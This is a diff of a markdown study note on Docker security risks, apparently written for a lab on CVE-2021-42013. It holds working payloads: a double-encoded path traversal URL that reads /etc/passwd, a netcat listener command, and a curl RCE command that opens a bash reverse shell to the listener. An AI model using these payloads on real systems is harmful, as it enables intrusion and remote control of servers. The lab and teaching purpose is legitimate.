@@ -2,7 +2,7 @@
 ## Docker: OWASP Top 10
 <details> 
 <summary> 1: Host OS Vulnerabilities </summary>
-#### If Host OS have vulnerabilities, attacker can use it to gain access to containers and apps running inside them.
+- If Host OS have vulnerabilities, attacker can use it to gain access to containers and apps running inside them.
 - Resolution: Regular patching of host OS, Usage of IDS, Firewall, Implement strict access controls
 
 #### CVE-2021-42013 (Path Traversal + RCE + Reverse Shell Attack)
@@ -11,4 +11,6 @@
 - Path Traversal payload - ``` http://172.17.0.2:80/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd ```
 - Actual payload After double URL decode - ``` http://172.17.0.2:80/cgi-bin/../../../../../../../etc/passwd ```
 - References: https://github.com/twseptian/cve-2021-42013-docker-lab
+- Netcat listening on ``` $ nc -lvnp 4444  ```
+- RCE Payload: ``` $ curl -s --path-as-is -d "echo Content-Type: text/plain; echo; bash -i >& /dev/tcp/172.17.0.1/4444 0>&1" "http://172.17.0.3:80/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/bash" ```
 </details>
